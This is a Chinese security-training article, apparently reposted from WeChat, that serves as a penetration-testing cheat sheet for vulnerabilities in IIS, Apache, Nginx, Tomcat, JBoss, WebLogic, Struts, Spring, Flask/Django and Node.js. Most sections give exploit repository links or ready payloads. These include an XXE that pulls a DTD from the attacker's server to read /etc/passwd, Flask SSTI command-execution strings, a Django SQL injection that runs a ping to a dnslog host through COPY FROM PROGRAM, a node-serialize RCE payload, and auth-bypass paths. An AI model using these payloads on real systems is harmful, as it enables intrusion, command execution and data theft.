> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IoEwWfsM-R_92RjcLnF29g)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

**--- 作者：掌控安全 - mss**  

一. IIS
------

#### 1. PUT 漏洞

```
用户配置不当，**exp**:https://github.com/hackping/HTTPMLScan.git
```

#### 2. 短文件名猜解

```
IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。  
**exp**:https://github.com/WebBreacher/tilde_enum
```

#### 3. 远程代码执行 (CVE-2017-7269))

```
**exp**:https://github.com/zcgonvh/cve-2017-7269
```

#### 4. 解析漏洞

```
iis6.0畸形解析：asa、cer
    iis6.0目录解析：/test.asp/test.jpg
    iis6.0文件解析：test.asp;.jpg
    IIS7.5文件解析：test.jpg/.php
```

#### 5. 认证绕过（`:$i30:$INDEX_ALLOCATION`）

```
安装php的iis6.0,例：访问`目标/admin/index.php`，显示`401`,访问
`/admin:$i30:$INDEX_ALLOCATION/index.php`即可  
    iis7.5:同上
```

二. Apache
---------

#### 1. 解析漏洞

```
用户配置不当，apace解析从右至左进行判断,如`1.php.a.b.c`，`c`不识别会向前进找，知道找到可识别后缀。
```

#### 2. 目录遍历

```
用户配置不当，扫描到目录直接访问即可
```

#### 3. 未授权访问漏洞

```
- shiro未授权访问漏洞（CVE-2020-1957）  
影响版本  
> shiro 1.5.2版本以下  
**poc**:构造`/目标/..;/admin`即可进入后台`
```

#### 4. rce

```
-ApacheOfbiz XMLRPC RCE(CVE-2020-9496)
>影响版本  
>ApacheOfbiz：<17.12.04
    poc步骤  
    step1:  
`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  CommonsBeanutils1   "你的指令" | base64 |  tr -d '\n'`  
    step:放入下面xml 中
```
    <?xml version="1.0"?>
    <methodCall>
    <methodName>ping</methodName>
    <params>
        <param>
        <value>test</value>
        </param>
    </params>
    </methodCall>
    ```
```

#### 5. 反序列化

```
-Dubbo2.7.6反序列化漏洞（CVE-2020-1948）
>影响版本
>Dubbo2.7.0 to 2.7.6  
Dubbo2.6.0 to 2.6.7  
Dubbo all 2.5.x versions (not supported by official team any longer)  
**exp**:https://github.com/ctlyz123/CVE-2020-1948.git
```

三. Nginx　
---------

#### 1. 文件解析

```
用户配置不当，对于任意文件名，在后面加上/任意文件名.php后该文件就会以php格式进行解析，如`1.png/.php`  
在`fast-cgi`关闭的情况下，`nginx<=0.8.37`依然存在解析漏洞，会将`1.jpg%00.php`同样解析成php文件
```

#### 2. 目录遍历

```
用户配置不当，扫描到目录直接访问即可
```

#### 3. CRLF 注入

```
CRLF是”回车+换行”（\r\n）的简称,其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP ResponseSplitting，简称HRS。
-会话固定漏洞   
构造如下链接`http://目标%0aSet-Cookie:sessionid=ghtwf01`
![](res/2020-11-30-14-16-35.png)  
可用于社工让管理员点击，有可能会获得管理员权限。
-通过CRLF注入消息头引发反射型XSS漏洞  
构造`http://目标%0d%0a%0d%0a<script>alert(/xss/);</script>`
```

#### 4. 目录穿越

```
用户配置不当，可通过`../`遍历
```

四. Tomcat
---------

#### 1. 任意文件上传

```
- cve-2017-12615  
>影响范围    
>ApacheTomcat7.0.0-7.0.81  
**exp**:https://raw.githubusercontent.com/zhzyker/exphub/master/tomcat/cve-2017-12615_cmd.py
```

#### 2. 文件读取 / 包含漏洞

```
- CVE-2020-1938  
影响范围
>ApacheTomcat6  
ApacheTomcat7<7.0.100  
ApacheTomcat8<8.5.51  
ApacheTomcat9<9.0.31  
**exp**:https://github.com/0nise/CVE-2020-1938
```

#### 3. 反序列化漏洞

```
- CVE-2020-9484  
>影响范围
><=9.0.34  
<=8.5.54  
<=7.0.103    
**exp**:https://github.com/masahiro331/CVE-2020-9484.git
```

#### 4. 进程注入

```
- cve没查到  
**exp**:https://github.com/rebeyond/memShell
5. war后门文件部署  
后台上传即可
```

五. jBoss
--------

#### 1. 反序列化漏洞

```
- CVE-2017-12149  
>影响范围  
>Jboss AS 5.x/6.x   
**exp**
    https://github.com/yunxu1/jboss-_CVE-2017-12149
```

#### 2. war 后门文件部署

```
后台上传war格式木马即可
```

六. WebLogic
-----------

#### 1. 反序列化漏洞

```
- CVE-2016-3510  
>影响范围  
>OracleWebLogicServer如下版本  
12.2.1.0  
12.1.3.0  
12.1.2.0  
10.3.6.0  
**exp 在后面**      
- CVE-2020-2551:Weblogic IIOP反序列化漏洞分析
>影响范围  
>OracleWeblogicServer如下版本  
10.3.6.0.0  
12.1.3.0.0  
12.2.1.3.0  
12.2.1.4.0  
14.1.1.0.0  
**exp 在后面**
```

#### 2. ssrf

```
- CVE-2014-4210
>影响版本  
>10.0.2  
10.3.6  
**exp 在后面**
```

#### 3. 任意文件上传 / 读取

```
-任意文件读取漏洞（CVE-2019-2615)）and文件上传漏洞（CVE-2019-2618）  
>影响范围
>OracleWeblogicServer如下版本  
10.3.6.0.0  
12.1.3.0.0  
12.2.1.3.0  
注意：该漏洞需要用户名密码的认证才可利用。
**exp 在后面**
```

#### 4. 远程代码执行漏洞

```
-Console HTTP 协议远程代码执行漏洞（CVE-2020-14882）
>OracleWeblogicServer如下版本  
10.3.6.0.0  
12.1.3.0.0  
12.2.1.3.0  
12.2.1.4.0  
14.1.1.0.0    
**上述exp地址**：https://github.com/0xn0ne/weblogicScanner
```

#### 5. war 后门文件部署

```
进入后台，上传war 格式木马即可
```

七. struts
---------

#### 1. 代码执行

```
>影响版本
>S2-057 CVE-2018-11776Struts2.3 to 2.3.34，Struts2.5 to 2.5.16   
    S2-048 CVE-2017-9791Struts2.3.X
    S2-046 CVE-2017-5638Struts2.3.5-2.3.31,Struts2.5-2.5.10      
    S2-045 CVE-2017-5638Struts2.3.5-2.3.31,Struts2.5-2.5.10      
    S2-037 CVE-2016-4438Struts2.3.20-2.3.28.1      
    S2-032 CVE-2016-3081Struts2.3.18-2.3.28      
    S2-020 CVE-2014-0094Struts2.0.0-2.3.16      
    S2-019 CVE-2013-4316Struts2.0.0-2.3.15.1      
    S2-016 CVE-2013-2251Struts2.0.0-2.3.15      
    S2-013 CVE-2013-1966Struts2.0.0-2.3.14      
    S2-009 CVE-2011-3923Struts2.0.0-2.3.1.1        
    S2-005 CVE-2010-1870Struts2.0.0-2.1.8.1    
    exp地址：https://github.com/Lucifer1993/struts-scan
![](res/2020-11-30-10-30-39.png)
```

八. java spring
--------------

#### 1. Jolokia xxe

```
poc
    step1:构造文件
```
    第一个文件 logback.xml
    <?xml version="1.0" encoding="utf-8" ?>
    <!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://你的服务器/fileread.dtd">%remote;%int;]>
    <a>&trick;</a>
    构造第二个文件 fileread.dtd
    <!ENTITY % d SYSTEM "file:///etc/passwd">
    <!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
    ```
    step2:将两个文件传入公网服务器
    step3:访问`目标/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/你的服务器!/logback.xml`
```

#### 2. Jolokia rce

```
[exp项目地址](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)
```

九. python
---------

#### 1. flask-ssti

```
python2
```
    #读文件
    `{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}`
    {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
    #写文件
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
    #执行指令
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)
    {{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}(system函数换为popen('').read()，需要导入os模块)
    {{().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}(不需要导入os模块，直接从别的模块调用)
    ```
    python3
```
    #文件读取
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
    #任意执行
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}
    ```
```

#### 2. Django-JSONfield-sql 注入 (CVE-2019-14234)

```
影响版本  
>Django  
>1.11.x before 1.11.23  
>2.1.x before 2.1.11  
>2.2.x before 2.2.4  
    poc
`http://目标/admin/vuln/collection/?detail__title')='1' or 1=1--`
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrgzp4RG4S3Q2Aw8qomGFia0ichQPAFMEv4wleGHtPcNuoVsfA77GKHPVTkmSiao9yRibyMbxiccyMxMAA/640?wx_fmt=png)  
结合`CVE-2019-9193`构造`?detail__title')%3d'1' or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20`  
因为是无回显执行，使用`ping`命令结合`dns_log`判断是否执行  
`?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'ping just.erh3bt.dnslog.cn'--%20`

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrgzp4RG4S3Q2Aw8qomGFia0jfNtNxeicLbftl3ictRAkpkafwpiam1gKn9cib2o3zibZjiaplj2vW0FqNvg/640?wx_fmt=png)

#### 3. Django debug page XSS 漏洞

```
直接访问`目标/create_user/?username=<script>alert('haha')</script>`
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrgzp4RG4S3Q2Aw8qomGFia0ndwiaR7QadMhtsOic5ObhAXaFnybz12D7ibwJdRhpdQoG3Btuy0Hqc7KQ/640?wx_fmt=png)  
再次访问

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrgzp4RG4S3Q2Aw8qomGFia0nJJ7TByjVLqHIXJ0ZZT4E7uUJPLk5rJDXGMyZ8icTwGkgs4Fz8kxn7g/640?wx_fmt=png)

#### 4. Django url 跳转漏洞 (CVE-2018-14574)

```
影响版本
>1.11.0<= version <1.11.15   
>2.0.0<= version <2.0.8
```

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcrgzp4RG4S3Q2Aw8qomGFia0O6gPWycnf5jTUcicx71Cxln3IrEVKA5jto8bUae7W5Lmib4aGwKI8PWQ/640?wx_fmt=gif)

十. node.js
----------

#### 1. 反序列化 RCE 漏洞

```
CVE-2017-5941  
poc：（***执行 ls /***）
    ```
    var y = {
    rce : function(){
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));
    ```
    生成结果如下
    ```
        Serialized:
        {"rce":"_$$ND_FUNC$$_function(){\n         require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }"}
    ```
```

注意，最后一个双引号前要补一个`()`  
最终结果如下

```
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

#### 2. 目录穿越漏洞

```
-    CVE-2017-14849  
影响版本
>Node.js 8.5.0+Express3.19.0-3.21.2
>Node.js 8.5.0+Express4.11.0-4.15.5
使用burp抓包构造`/static/../../../a/../../../../etc/passwd`即可。
```

  

**回顾往期内容**

[一起来学 PHP 代码审计（一）入门](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487858&idx=1&sn=47c58061798afda9f50d6a3b838f184e&chksm=fa686803cd1fe115a3af2e3b1e42717dcc6d8751c888d686389f6909695b0ae0e1f4d58e24b3&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[新时代的渗透思路！微服务下的信息搜集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487493&idx=1&sn=9ca65b3b6098dfa4d53a0d60be4bee51&chksm=fa686974cd1fe062500e5afb03a0181a1d731819f7535c36b61c05b3c6144807e0a76a0130c5&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**